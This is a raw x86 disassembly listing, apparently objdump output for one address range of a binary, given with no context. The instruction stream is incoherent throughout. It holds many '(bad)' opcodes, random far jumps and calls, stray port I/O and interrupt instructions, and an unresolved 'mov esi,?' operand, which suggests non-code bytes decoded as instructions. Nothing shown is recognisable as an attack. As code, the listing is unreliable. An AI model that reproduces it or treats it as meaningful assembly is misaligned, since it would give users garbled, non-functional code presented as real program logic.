  40929d:	lds    ebx,FWORD PTR [esi]
  40929f:	push   eax
  4092a0:	(bad)  
  4092a1:	and    al,0x11
  4092a3:	push   ds
  4092a4:	xlat   BYTE PTR ds:[ebx]
  4092a5:	pop    edi
  4092a6:	jb     0x4092ca
  4092a8:	xor    BYTE PTR [ebp-0x2fb59984],ah
  4092ae:	dec    esi
  4092af:	jbe    0x4092be
  4092b1:	sbb    ecx,edx
  4092b3:	mov    edx,0xce89c3be
  4092b8:	fisubr DWORD PTR [eax+0x32]
  4092bb:	lahf   
  4092bc:	clc    
  4092bd:	adc    DWORD PTR [edi-0x73],edi
  4092c0:	cmc    
  4092c1:	mov    bl,0xaf
  4092c3:	retf   
  4092c4:	je     0x4092f2
  4092c6:	stos   DWORD PTR es:[edi],eax
  4092c7:	mov    edx,0x3f17fcd1
  4092cc:	sub    ecx,ebx
  4092ce:	push   eax
  4092cf:	push   esi
  4092d0:	int    0xf3
  4092d2:	lea    ebp,fs:[esi]
  4092d5:	cmp    DWORD PTR [edi-0x3e345295],eax
  4092db:	leave  
  4092dc:	aas    
  4092dd:	mov    DWORD PTR [ebp-0x56],ebx
  4092e0:	xchg   edx,eax
  4092e1:	sub    DWORD PTR [ecx-0x4a459d1f],esp
  4092e7:	sbb    DWORD PTR [eax+0x70],esi
  4092ea:	cmp    al,BYTE PTR [eax+0x2b04068f]
  4092f0:	xor    ebp,DWORD PTR [edi-0xb33a7f6]
  4092f6:	test   eax,0xbc0f2c1a
  4092fb:	and    al,0xb
  4092fd:	dec    eax
  4092fe:	repz imul ebp,esi,0xeb7731a
  409305:	mov    esi,cs
  409307:	fisubr DWORD PTR [esi-0x3]
  40930a:	sub    BYTE PTR [ebp+esi*2+0x10],dh
  40930e:	sbb    ah,BYTE PTR [ecx+0x2cea082]
  409314:	daa    
  409315:	loopne 0x4092a3
  409317:	xchg   ebx,eax
  409318:	jmp    0x409397
  40931a:	leave  
  40931b:	(bad)  
  40931c:	mov    ch,0x27
  40931e:	loope  0x4092dd
  409320:	mov    esp,0x677151f4
  409325:	scas   eax,DWORD PTR es:[edi]
  409326:	(bad)  
  409328:	jae    0x409329
  40932a:	stc    
  40932b:	mov    ebx,0x52341791
  409330:	shr    DWORD PTR [edi+eax*8],1
  409333:	cdq    
  409334:	dec    eax
  409335:	jb     0x409318
  409337:	adc    eax,0xa77b48a
  40933c:	or     eax,0xc59961ed
  409341:	push   cs
  409342:	scas   eax,DWORD PTR es:[edi]
  409343:	ffreep st(7)
  409345:	push   esp
  409346:	sbb    al,0x18
  409348:	popf   
  409349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40934a:	lahf   
  40934b:	inc    esp
  40934c:	pop    eax
  40934d:	and    DWORD PTR [edx+eax*2],edi
  409350:	ror    dh,0x63
  409353:	pop    ebx
  409354:	(bad)  
  409355:	retf   
  409356:	push   esp
  409357:	inc    esp
  409358:	retf   
  409359:	inc    ecx
  40935a:	rol    bh,0x29
  40935d:	mov    ch,0xc
  40935f:	sub    edx,DWORD PTR [eax+edx*1+0x2c]
  409363:	or     DWORD PTR [eax+0x6f],ecx
  409366:	mov    ebp,0x70d86d4
  40936b:	mov    dh,0x6a
  40936d:	push   ds
  40936e:	mov    ebp,0xbab64598
  409373:	pop    edi
  409374:	adc    al,0x4c
  409376:	jae    0x409307
  409378:	xor    al,0xe2
  40937a:	shr    DWORD PTR [eax],cl
  40937c:	mov    ebx,0xefa8c0c3
  409381:	in     al,dx
  409382:	pop    edx
  409383:	or     bh,BYTE PTR [esp+edx*1+0x4c]
  409387:	push   esp
  409388:	daa    
  409389:	inc    ebp
  40938a:	mov    si,0x8be3
  40938e:	loope  0x40939b
  409390:	xchg   ebp,eax
  409391:	mov    ch,0xdb
  409393:	add    eax,0xa001446b
  409398:	ss jbe 0x4093c2
  40939b:	sub    eax,0x5f8bf0b8
  4093a0:	(bad)  
  4093a1:	fcom   QWORD PTR [ecx-0x305c071]
  4093a7:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4093a9:	xor    bl,al
  4093ab:	(bad)
  4093af:	inc    ecx
  4093b0:	jecxz  0x4093a5
  4093b2:	js     0x409368
  4093b4:	push   ebp
  4093b5:	xor    cl,BYTE PTR [eax]
  4093b7:	in     al,0x36
  4093b9:	mov    cl,0x42
  4093bb:	sub    DWORD PTR [esi],eax
  4093bd:	mov    al,0x76
  4093bf:	and    ecx,ebx
  4093c1:	(bad)  
  4093c2:	lods   al,BYTE PTR ds:[esi]
  4093c3:	xor    dl,BYTE PTR [eax+edx*2]
  4093c6:	xor    edi,DWORD PTR [ebx+0x7a]
  4093c9:	add    BYTE PTR [ebx-0x406cfb34],0x8e
  4093d0:	int    0xd5
  4093d2:	pop    ebx
  4093d3:	mov    bh,BYTE PTR [esi]
  4093d5:	inc    edx
  4093d6:	aaa    
  4093d7:	jmp    0x572a:0xbc5e99f3
  4093de:	pop    ss
  4093df:	or     al,0xb8
  4093e1:	mov    edx,0x3e3b0856
  4093e6:	jl     0x409384
  4093e8:	sbb    DWORD PTR [edx+0x5],0x6f684b75
  4093ef:	aad    0xea
  4093f1:	and    cl,0x78
  4093f4:	cmp    DWORD PTR [eax],ecx
  4093f6:	fwait
  4093f7:	pop    esi
  4093f8:	push   ecx
  4093f9:	inc    esp
  4093fa:	cdq    
  4093fb:	dec    edi
  4093fc:	and    eax,esp
  4093fe:	mov    edi,0xebdf0e00
  409403:	fist   WORD PTR [ecx]
  409405:	mov    eax,0x6061cab3
  40940a:	fwait
  40940b:	ins    BYTE PTR es:[edi],dx
  40940c:	adc    BYTE PTR [esi],dl
  40940e:	das    
  40940f:	mov    eax,ds:0x97207e0a
  409414:	ss jb  0x409430
  409417:	mov    esi,0xda8df4aa
  40941c:	inc    eax
  40941d:	and    al,0x5c
  40941f:	xchg   edi,eax
  409420:	pushw  es
  409422:	mov    edi,0xd85d0016
  409427:	out    dx,al
  409428:	adc    eax,0x2a1bc207
  40942d:	int    0x45
  40942f:	mov    bh,0x6d
  409431:	out    0x63,eax
  409433:	ficomp WORD PTR [esi-0x5f]
  409436:	test   eax,0xe9115d00
  40943b:	loope  0x40941b
  40943d:	lea    esp,[ebx-0x6d]
  409440:	mov    cl,0x18
  409442:	scas   eax,DWORD PTR es:[edi]
  409443:	fdivrp st(5),st
  409445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409446:	ret    
  409447:	fwait
  409448:	inc    edi
  409449:	popf   
  40944a:	in     al,dx
  40944b:	inc    ebx
  40944c:	repz push cs
  40944e:	and    ebx,DWORD PTR [ecx]
  409450:	arpl   WORD PTR ds:0x354379c8,sp
  409456:	icebp  
  409457:	(bad)  
  409458:	std    
  409459:	cmp    al,0xb5
  40945b:	dec    ebp
  40945c:	(bad)  
  40945e:	out    dx,al
  40945f:	gs inc dx
  409462:	mov    edi,0x56fc0d1b
  409467:	aad    0x62
  409469:	add    esp,DWORD PTR [ecx]
  40946b:	xor    al,0xb
  40946d:	xor    DWORD PTR [ecx+0x4221e128],ecx
  409473:	or     eax,0x60c62d0a
  409478:	std    
  409479:	imul   ebp,DWORD PTR [eax],0x3f
  40947c:	call   0xab14:0x6aa5d413
  409483:	out    dx,al
  409484:	sbb    ebx,DWORD PTR [ebx-0x3d7f27c7]
  40948a:	rcl    BYTE PTR [edi],1
  40948c:	jns    0x409469
  40948e:	fmul   QWORD PTR es:[esi]
  409491:	xor    eax,0xbe76b022
  409496:	aas    
  409497:	rol    BYTE PTR [ecx+0x61f08f7d],1
  40949d:	xlat   BYTE PTR ds:[ebx]
  40949e:	adc    eax,0xcd44c546
  4094a4:	mov    dh,0xc2
  4094a6:	cld    
  4094a7:	aad    0x3
  4094a9:	les    edi,FWORD PTR [esi+0x9]
  4094ac:	jg     0x409444
  4094ae:	push   edx
  4094af:	add    DWORD PTR [ebp+0x28a2fbf3],esi
  4094b5:	popa   
  4094b6:	dec    ecx
  4094b7:	mov    esp,0xee2af3d2
  4094bc:	jecxz  0x4094e7
  4094be:	test   eax,0xacb8b689
  4094c3:	cmp    eax,0xa4fe3115
  4094c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094c9:	fisttp DWORD PTR [edx-0x18]
  4094cc:	into   
  4094cd:	retf   0x38c8
  4094d0:	cmp    BYTE PTR [edi],0x74
  4094d3:	nop
  4094d4:	and    al,0xd7
  4094d6:	repz aas 
  4094d8:	mov    dh,0x28
  4094da:	pop    es
  4094db:	dec    ecx
  4094dc:	mov    eax,0x314a7485
  4094e1:	sbb    DWORD PTR [eax],0xffffffd3
  4094e4:	in     eax,0x30
  4094e6:	jg     0x4094b1
  4094e8:	xchg   esp,eax
  4094e9:	mov    eax,0x165df87c
  4094ee:	inc    ebx
  4094ef:	loopne 0x409532
  4094f1:	fbstp  TBYTE PTR [ecx]
  4094f3:	shl    DWORD PTR [ebp+esi*4+0x139cef3a],1
  4094fa:	sub    BYTE PTR [esi+eiz*1],dh
  4094fd:	jecxz  0x409490
  4094ff:	mov    ch,0x54
  409501:	mov    edi,0xdedfa647
  409506:	test   eax,0xda9f0122
  40950b:	push   ebp
  40950c:	dec    esi
  40950d:	fbstp  TBYTE PTR [eax-0x22]
  409510:	arpl   WORD PTR [ebp+0x27],cx
  409513:	xor    ch,BYTE PTR [esi+0x602995c2]
  409519:	dec    ecx
  40951a:	and    dl,dh
  40951c:	ffree  st(3)
  40951e:	dec    ebp
  40951f:	stc    
  409520:	sbb    esi,0xbffaccd4
  409526:	and    ebx,edx
  409528:	test   eax,0xd67c2a35
  40952d:	dec    ebx
  40952e:	mov    esp,0xa09b97ca
  409533:	inc    edx
  409534:	gs ins DWORD PTR es:[edi],dx
  409536:	stos   DWORD PTR es:[edi],eax
  409537:	or     bh,BYTE PTR [edi+0x55]
  40953a:	out    dx,al
  40953b:	push   cs
  40953c:	out    dx,al
  40953d:	aaa    
  40953e:	xor    ebx,ebx
  409540:	cwde   
  409541:	repz call 0x539eba5e
  409547:	daa    
  409548:	js     0x409526
  40954a:	daa    
  40954b:	mov    cl,0xf8
  40954d:	mov    esi,?
  40954f:	stos   BYTE PTR es:[edi],al
  409550:	pop    es
  409551:	js     0x409520
  409553:	leave  
  409554:	aaa    
  409555:	outs   dx,BYTE PTR ds:[esi]
  409556:	sbb    dl,al
  409558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409559:	mov    al,ds:0x592b4f3b
  40955e:	cmp    eax,0xd6bcc9f
  409563:	mov    eax,0x58964190
  409568:	test   eax,0xf5d0bb8b
  40956d:	and    BYTE PTR ds:0xbad3da00,cl
  409573:	fisttp QWORD PTR [ebp+0x3193fc02]
  409579:	mov    al,0xbd
  40957b:	jmp    0xf365:0x4431c631
  409582:	cs inc ebp
  409584:	fld    QWORD PTR ds:0x56f2d2c8
  40958a:	sub    esi,edx
  40958c:	jno    0x4095ca
  40958e:	pop    edx
  40958f:	mov    edi,0x4cab294a
  409594:	inc    BYTE PTR [edx+0x2471f367]
  40959a:	xchg   BYTE PTR ds:[eax],al
  40959d:	sbb    dh,BYTE PTR [ecx-0x6770415f]
  4095a3:	iret   
  4095a4:	fs xchg edi,eax
  4095a6:	adc    DWORD PTR [edx+0x632d1fe],ebp
  4095ac:	dec    ebp
  4095ad:	retf   
  4095ae:	clc    
  4095af:	dec    edi
  4095b0:	cmc    
  4095b1:	popa   
  4095b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095b3:	adc    eax,0x86a3245a
  4095b8:	jno    0x409581
  4095ba:	and    al,0xbe
  4095bc:	add    DWORD PTR [esi-0x5a599600],0xccb8789d
  4095c6:	sbb    ecx,ecx
  4095c8:	out    dx,al
  4095c9:	mov    dh,0x1c
  4095cb:	push   ebp
  4095cc:	jne    0x40955a
  4095ce:	xor    ebp,DWORD PTR [ebp+0x1c]
  4095d1:	jecxz  0x4095b3
  4095d3:	mov    ch,0x80
  4095d5:	mov    BYTE PTR [ebp-0x59],ch
  4095d8:	mov    dl,ch
  4095da:	and    ecx,DWORD PTR [edx-0x2f]
  4095dd:	xchg   edi,eax
  4095de:	dec    ecx
  4095df:	pushf  
  4095e0:	sbb    ecx,edx
  4095e2:	rcr    ebp,cl
  4095e4:	inc    ebp
  4095e5:	and    al,0x34
  4095e7:	xor    al,dh
  4095e9:	imul   ecx,DWORD PTR [edx+0x17186dce],0x50c7c130
  4095f3:	leave  
  4095f4:	fs push eax
  4095f6:	mov    ds:0xa4426c3,eax
  4095fb:	and    eax,0xea7559bf
  409600:	xchg   edi,eax
  409601:	mov    bl,0x49
  409603:	push   cs
  409604:	inc    esi
  409605:	xor    eax,0x9b3f0b76
  40960a:	adc    BYTE PTR [ecx-0x542e28e9],al
  409610:	out    dx,al
  409611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409612:	jnp    0x409634
  409614:	fidiv  WORD PTR [edx-0x1063d673]
  40961a:	push   esp
  40961b:	rol    BYTE PTR [edi],cl
  40961d:	sub    BYTE PTR [ecx-0x795aa19d],bl
  409623:	inc    esi
  409624:	cmc    
  409625:	jbe    0x409645
  409627:	cld    
  409628:	ins    BYTE PTR es:[edi],dx
  409629:	mov    BYTE PTR [ebx],dl
  40962b:	mov    dl,0x5f
  40962d:	sub    eax,0xa29f9b73
  409632:	ins    DWORD PTR es:[edi],dx
  409633:	or     al,0x33
  409635:	and    al,0x56
  409637:	popa   
  409638:	cmc    
  409639:	cli    
  40963a:	jae    0x409629
  40963c:	jg     0x40967d
  40963e:	mov    al,ds:0x26386a38
  409643:	add    eax,0xae66a661
  409648:	into   
  409649:	icebp  
  40964a:	jle    0x4096af
  40964c:	adc    eax,0xc00c0225
  409651:	out    0x73,eax
  409653:	sub    DWORD PTR [ecx-0x27],ebp
  409656:	push   edi
  409657:	push   0x31
  409659:	jae    0x409655
  40965b:	in     al,dx
  40965c:	adc    al,0x16
  40965e:	jmp    0x669453d5
  409663:	cmp    al,0x61
  409665:	aam    0x12
  409667:	ds add cl,cl
  40966a:	inc    eax
  40966b:	retf   0x2f6f
  40966e:	jecxz  0x409677
  409670:	sahf   
  409671:	lods   al,BYTE PTR ds:[esi]
  409672:	data16 into 
  409674:	xlat   BYTE PTR ds:[ebx]
  409675:	mov    al,ds:0x3fc98527
  40967a:	ss mov esi,0x7104c38
  409680:	xor    DWORD PTR [ebp+0x54],ebx
  409683:	into   
  409684:	mov    al,al
  409686:	mov    cl,0x3d
  409688:	fild   WORD PTR [ebx-0x1d751ccb]
  40968e:	add    BYTE PTR [ebx+edi*2+0x45],0x10
  409693:	cs push 0x2f
  409696:	xor    al,0xcc
  409698:	ror    DWORD PTR [ebx],0x23
  40969b:	lahf   
  40969c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40969d:	adc    edi,DWORD PTR [ecx+0x376a0f8b]
  4096a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a4:	and    eax,0xff2d0d16
  4096a9:	sub    edx,DWORD PTR [ebx-0x74]
  4096ac:	adc    esi,edx
  4096ae:	xchg   esi,eax
  4096af:	ins    BYTE PTR es:[edi],dx
  4096b0:	imul   edx,DWORD PTR [eax],0x2cc0e2ef
  4096b6:	nop
  4096b7:	dec    esi
  4096b8:	leave  
  4096b9:	aas    
  4096ba:	int3   
  4096bb:	or     edi,edx
  4096bd:	mov    cl,0x29
  4096bf:	clc    
  4096c0:	stos   DWORD PTR es:[edi],eax
  4096c1:	xchg   BYTE PTR [esp+eiz*2+0x2e],bh
  4096c5:	outs   dx,DWORD PTR ds:[esi]
  4096c6:	sti    
  4096c7:	cdq    
  4096c8:	sti    
  4096c9:	cld    
  4096ca:	inc    edx
  4096cb:	cwde   
  4096cc:	lock mov edx,0xa7484b2f
  4096d2:	ins    BYTE PTR es:[edi],dx
  4096d3:	ja     0x409738
  4096d5:	jb     0x409661
  4096d7:	mov    bl,0x5e
  4096d9:	dec    edi
  4096da:	or     esp,eax
  4096dc:	mov    cs,WORD PTR [ebp+0x45]
  4096df:	push   ss
  4096e0:	sub    eax,0x76753947
  4096e5:	js     0x409736
  4096e7:	jae    0x40970e
  4096e9:	mov    eax,ds:0x65f9d180
  4096ee:	cmp    al,0x95
  4096f0:	aaa    
  4096f1:	sub    eax,0x58d9c459
  4096f6:	jo     0x40973e
  4096f8:	pop    esp
  4096f9:	push   esp
  4096fa:	sbb    dh,BYTE PTR [esi+0x44]
  4096fd:	mov    bl,0xbc
  4096ff:	arpl   WORD PTR [edi-0x5],sp
  409702:	ror    BYTE PTR [ecx-0x5f641d5f],1
  409708:	std    
  409709:	pop    esp
  40970a:	pop    edx
  40970b:	sbb    dh,dl
  40970d:	xchg   ebp,eax
  40970e:	sbb    eax,0xa8144e74
  409713:	add    al,0xa9
  409715:	mov    eax,0x522c214e
  40971a:	add    al,0xa0
  40971c:	jne    0x4096e8
  40971e:	add    BYTE PTR ds:0x3c006d52,dh
  409724:	pop    eax
  409725:	es aas 
  409727:	jae    0x40974f
  409729:	xor    BYTE PTR [ebp+0x65],dl
  40972c:	test   BYTE PTR [ecx+ebx*1-0x32df546],ah
  409733:	sub    BYTE PTR [edx-0x349fccbb],al
  409739:	jmp    0x8aa:0x71d21cde
  409740:	jecxz  0x4096ec
  409742:	xadd   BYTE PTR [edi+0x5c913c53],dl
  409749:	loopne 0x40976e
  40974b:	pushf  
  40974c:	in     al,0x15
  40974e:	jnp    0x40977d
  409750:	mov    ah,0xbf
  409752:	fild   WORD PTR [esi]
  409754:	loope  0x4097b6
  409756:	pop    edi
  409757:	div    cl
  409759:	mov    dl,0x5b
  40975b:	out    dx,al
  40975c:	xor    DWORD PTR [edi-0x49],edx
  40975f:	je     0x409778
  409761:	clc    
  409762:	xchg   sp,ax
  409764:	add    eax,0xe610354c
  409769:	mov    ah,0xa8
  40976b:	gs ins BYTE PTR es:[edi],dx
  40976d:	ins    DWORD PTR es:[edi],dx
  40976e:	fcom   QWORD PTR [eax+ecx*4-0x1ad86ce1]
  409775:	cmp    ah,BYTE PTR [ebx+0xeae669d]
  40977b:	cs repz call 0x45b3:0xdda35e43
  409784:	add    ecx,DWORD PTR [edx+0x51]
  409787:	or     eax,edx
  409789:	fwait
  40978a:	ja     0x4097c2
  40978c:	daa    
  40978d:	(bad)  
  40978e:	push   esi
  40978f:	xlat   BYTE PTR ds:[ebx]
  409790:	sub    edx,edi
  409792:	xchg   edi,eax
  409793:	outs   dx,BYTE PTR ds:[esi]
  409794:	adc    DWORD PTR [ecx],ebx
  409796:	arpl   WORD PTR [ebx+0x72],di
  409799:	(bad)  
  40979a:	icebp  
  40979b:	cdq    
  40979c:	cwde   
  40979d:	js     0x40980f
  40979f:	das    
  4097a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097a1:	out    0xe3,eax
  4097a3:	mov    bh,0xff
  4097a5:	and    bl,dh
  4097a7:	mov    DWORD PTR [edx+0x79],eax
  4097aa:	push   cs
  4097ab:	(bad)  
  4097ac:	ss xchg ecx,eax
  4097ae:	fst    DWORD PTR [edi]
  4097b0:	xchg   esi,eax
  4097b1:	and    al,0xc
  4097b3:	jl     0x4097f5
  4097b5:	ftst   
  4097b7:	ins    DWORD PTR es:[edi],dx
  4097b8:	popa   
  4097b9:	ror    DWORD PTR [edi-0x73],cl
  4097bc:	mov    eax,0x1ec2aef2
  4097c1:	std    
  4097c2:	jno    0x409814
  4097c4:	adc    BYTE PTR [ebx],0xbe
  4097c7:	into   
  4097c8:	ds adc al,0xa2
  4097cb:	mov    ds:0x3a080cdb,al
  4097d0:	fs push esp
  4097d2:	repnz xor al,0x94
  4097d5:	jmp    0x6c8469df
  4097da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097db:	mov    esp,0x8a09fe2b
  4097e0:	fld    DWORD PTR [eax+0x5f]
  4097e3:	enter  0x3196,0x42
  4097e7:	(bad)  [eax]
  4097e9:	rol    BYTE PTR ds:0xdda14dee,0xc5
  4097f0:	and    al,dh
  4097f2:	add    di,WORD PTR [ecx]
  4097f5:	adc    DWORD PTR ds:0x50666f1d,esi
  4097fb:	mov    ds:0xed08fadb,eax
  409800:	adc    BYTE PTR [eax+edx*8],ah
  409803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409804:	and    al,0xb2
  409806:	and    ah,ch
  409808:	push   edi
  409809:	fwait
  40980a:	in     al,dx
  40980b:	inc    eax
  40980c:	call   FWORD PTR ds:0x779ddd8a
  409812:	repnz sbb esi,eax
  409815:	push   esi
  409816:	sub    eax,edi
  409818:	adc    esp,DWORD PTR [eax]
  40981a:	push   ecx
  40981b:	lea    edi,[ecx-0x59f6ceb2]
  409821:	dec    ebp
  409822:	xchg   esp,eax
  409823:	push   0xfffffff9
  409825:	or     eax,0xee7543ee
  40982a:	push   esp
  40982b:	xlat   BYTE PTR ds:[ebx]
  40982c:	hlt    
  40982d:	xchg   ebx,eax
  40982e:	inc    esp
  40982f:	sbb    eax,0xb1000bbb
  409834:	cli    
  409835:	adc    DWORD PTR [edx+0x71],edx
  409838:	inc    eax
  409839:	ins    DWORD PTR es:[edi],dx
  40983a:	leave  
  40983b:	jne    0x409825
  40983d:	loope  0x409827
  40983f:	mov    cl,0x33
  409841:	aad    0x79
  409843:	mov    ebx,0x7500ee21
  409848:	sbb    eax,0x8505ade1
  40984d:	push   0x335be7bc
  409852:	jae    0x4097dd
  409854:	cwde   
  409855:	cmp    al,0x36
  409857:	and    DWORD PTR [ebp+0x7f],edi
  40985a:	push   ds
  40985b:	outs   dx,DWORD PTR ds:[esi]
  40985c:	pop    edi
  40985d:	fbstp  TBYTE PTR [eax-0x70]
  409860:	jmp    0x678a:0x80baa1a2
  409867:	imul   eax,esi,0xffffffb3
  40986a:	inc    esi
  40986b:	scas   eax,DWORD PTR es:[edi]
  40986c:	ficomp DWORD PTR [ebx-0x5c1715c1]
  409872:	mov    dh,0xa3
  409874:	pop    esi
  409875:	mov    bh,0x3
  409877:	add    eax,0xabbd5b10
  40987c:	retf   0xabc0
  40987f:	xor    DWORD PTR [eax],0xd9f835d3
  409885:	sar    BYTE PTR [edi],0xd4
  409888:	stc    
  409889:	dec    eax
  40988a:	jbe    0x40983a
  40988c:	retf   
  40988d:	in     al,0x8
  40988f:	(bad)  
  409891:	mov    ah,0x16
  409893:	sbb    bl,BYTE PTR [ebp-0x7786597a]
  409899:	cwde   
  40989a:	cmp    bl,al
  40989c:	lea    ebp,[ebp-0x29]
  40989f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098a0:	mov    esp,0x9d40cef9
  4098a5:	lahf   
  4098a6:	mov    al,0xbe
  4098a8:	xchg   edi,eax
  4098a9:	cmp    al,0x75
  4098ab:	push   ds
  4098ac:	ja     0x4098e1
  4098ae:	rcr    DWORD PTR [ebx-0x61eff475],cl
  4098b4:	push   ss
  4098b5:	sub    dl,BYTE PTR [eax-0xc]
  4098b8:	scas   eax,DWORD PTR es:[edi]
  4098b9:	push   eax
  4098ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098bb:	scas   eax,DWORD PTR es:[edi]
  4098bc:	xchg   BYTE PTR [eax+0x12],ch
  4098bf:	icebp  
  4098c0:	(bad)  
  4098c1:	jno    0x40985c
  4098c3:	or     al,0xbe
  4098c5:	fisub  WORD PTR [edi]
  4098c7:	mov    ebx,0xe9e1eeff
  4098cc:	je     0x40990c
  4098ce:	cmp    edx,edx
  4098d0:	dec    edx
  4098d1:	pop    ebx
  4098d2:	test   eax,0x29b5dd83
  4098d7:	jne    0x409884
  4098d9:	outs   dx,DWORD PTR ds:[esi]
  4098da:	inc    ecx
  4098db:	adc    al,0x35
  4098dd:	push   ss
  4098de:	mov    ch,BYTE PTR [edx]
  4098e0:	cmp    BYTE PTR [ebp+edx*1+0x710a8caa],dh
  4098e7:	push   ss
  4098e8:	daa    
  4098e9:	inc    esp
  4098ea:	loop   0x4098b1
  4098ec:	(bad)  
  4098ed:	cli    
  4098ee:	adc    al,BYTE PTR [edi+edi*8+0x1d907477]
  4098f5:	cld    
  4098f6:	xchg   edi,eax
  4098f7:	jp     0x4098f2
  4098f9:	jbe    0x4098d5
  4098fb:	xor    ebx,esp
  4098fd:	fld    DWORD PTR [eax]
  4098ff:	(bad)  
  409900:	fs adc BYTE PTR ds:[ecx+eax*2+0x61],bh
  409906:	sbb    WORD PTR ds:[edx+0x28],dx
  40990b:	data16 sub al,cl
  40990e:	push   edx
  40990f:	sub    ecx,ebp
  409911:	or     DWORD PTR [eax],eax
  409913:	adc    al,0xac
  409915:	jmp    0xdaf1808f
  40991a:	std    
  40991b:	and    eax,0xb73008d7
  409920:	lods   eax,DWORD PTR ds:[esi]
  409921:	mov    esi,0xa388c7cc
  409926:	mov    dh,0xa5
  409928:	sbb    esi,0xffffffac
  40992b:	in     al,dx
  40992c:	ds call 0xbf23556b
  409932:	loop   0x4098f0
  409934:	out    dx,al
  409935:	cmp    BYTE PTR ds:0x69723d4d,dl
  40993b:	push   esi
  40993c:	popf   
  40993d:	cmp    cl,BYTE PTR [eax-0x61b092c0]
  409943:	loopne 0x409915
  409945:	iret   
  409946:	or     ebx,DWORD PTR [eax+0x2e]
  409949:	test   DWORD PTR [esi+eax*1+0x288f6667],esp
  409950:	rol    DWORD PTR [esi],0x76
  409953:	lds    esi,FWORD PTR [eax-0x38b3473c]
  409959:	dec    esi
  40995a:	sub    eax,0x49070f2e
  40995f:	lock mov ch,0xa
  409962:	jnp    0x409989
  409964:	fdiv   st(7),st
  409966:	in     al,dx
  409967:	call   0xc83d721b
  40996c:	cld    
  40996d:	ins    BYTE PTR es:[edi],dx
  40996e:	ins    DWORD PTR es:[edi],dx
  40996f:	and    eax,0x931413f7
  409974:	rcl    BYTE PTR [ebx+0x4d],0x7b
  409978:	push   esi
  409979:	cs inc edx
  40997b:	imul   ebx,ecx,0x13
  40997e:	into   
  40997f:	push   0xa8a116ee
  409984:	mov    al,ds:0x41153b15
  409989:	fwait
  40998a:	mov    ds:0x1f731beb,al
  40998f:	repnz mov eax,0xbb166922
  409995:	fisub  WORD PTR [edx-0xb753a43]
  40999b:	ret    
  40999c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40999d:	cli    
  40999e:	(bad)  
  40999f:	adc    BYTE PTR [edi],dl
  4099a1:	pop    ds
  4099a2:	adc    al,0xf7
  4099a4:	adc    al,0x20
  4099a6:	dec    esp
  4099a7:	mov    cl,0xa9
  4099a9:	test   eax,0x8d606676
  4099ae:	or     ebp,DWORD PTR [edx]
  4099b0:	push   ecx
  4099b1:	rcl    DWORD PTR [edi-0x4ee6a1a6],0x42
  4099b8:	mov    edx,0xb9f4296f
  4099bd:	adc    esi,ebp
  4099bf:	icebp  
  4099c0:	push   esi
  4099c1:	push   ebx
  4099c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099c3:	sbb    al,0x72
  4099c5:	push   esi
  4099c6:	mov    ds:0x98c3c1b0,al
  4099cb:	loopne 0x409a0e
  4099cd:	pop    edi
  4099ce:	ret    0x3d12
  4099d1:	call   0x5243:0xc4ba740
  4099d8:	(bad)  
  4099da:	jg     0x4099fd
  4099dc:	pop    esp
  4099dd:	push   cs
  4099de:	adc    BYTE PTR [edi-0x17b4e409],cl
  4099e4:	xchg   esp,eax
  4099e5:	mov    bl,0x3c
  4099e7:	or     eax,0xaf12c014
  4099ec:	xchg   esp,eax
  4099ed:	ss ss out dx,eax
  4099f0:	sbb    DWORD PTR [edi+0x11],ecx
  4099f3:	mov    ecx,0x7f425b49
  4099f8:	mov    dh,dl
  4099fa:	dec    ecx
  4099fb:	add    al,dh
  4099fd:	mov    ds:0xf4e225d1,al
  409a02:	arpl   WORD PTR [eax],dx
  409a04:	icebp  
  409a05:	sub    BYTE PTR [eax-0x27858b44],ah
  409a0b:	(bad)  
  409a0c:	js     0x409a51
  409a0e:	stos   DWORD PTR es:[edi],eax
  409a0f:	gs repz jge 0x4099bc
  409a13:	sbb    eax,0x908b542a
  409a18:	push   0x54d7f561
  409a1d:	fisttp DWORD PTR [edi+eax*2+0x62]
  409a21:	sbb    eax,0x8219cbef
  409a26:	fistp  QWORD PTR ds:0xfa7db830
  409a2c:	in     al,dx
  409a2d:	jmp    0x7e9c:0x54d07f0a
  409a34:	daa    
  409a35:	push   ss
  409a36:	(bad)  
  409a37:	rcl    DWORD PTR [edx+0x22f1dd14],1
  409a3d:	in     eax,dx
  409a3e:	je     0x409a7e
  409a40:	je     0x4099e5
  409a42:	pop    esi
  409a43:	xlat   BYTE PTR ds:[ebx]
  409a44:	push   eax
  409a45:	sar    BYTE PTR [ebx],1
  409a47:	cmp    eax,0x3c81833
  409a4c:	add    al,0xdf
  409a4e:	mov    esi,ebx
  409a50:	into   
  409a51:	pusha  
  409a52:	sbb    edx,ebp
  409a54:	mov    ah,BYTE PTR [esi]
  409a56:	and    esi,DWORD PTR [ebx-0x19]
  409a59:	push   ss
  409a5a:	xchg   ecx,eax
  409a5b:	out    dx,eax
  409a5c:	outs   dx,BYTE PTR ds:[esi]
  409a5d:	fwait
  409a5e:	and    dh,BYTE PTR [esp+esi*4+0x4934efdd]
  409a65:	sub    DWORD PTR [edx+0x660e1772],0x8f72c02
  409a6f:	cmp    BYTE PTR [ecx+eiz*4-0x1f2bdf03],bl
  409a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a77:	mov    bh,BYTE PTR [ebp+0x54]
  409a7a:	imul   esi,DWORD PTR [edx],0x7e
  409a7d:	push   esp
  409a7e:	pop    ecx
  409a7f:	dec    edx
  409a80:	adc    BYTE PTR [edx-0x2b302ccc],0xcf
  409a87:	data16 and BYTE PTR gs:[edi],ch
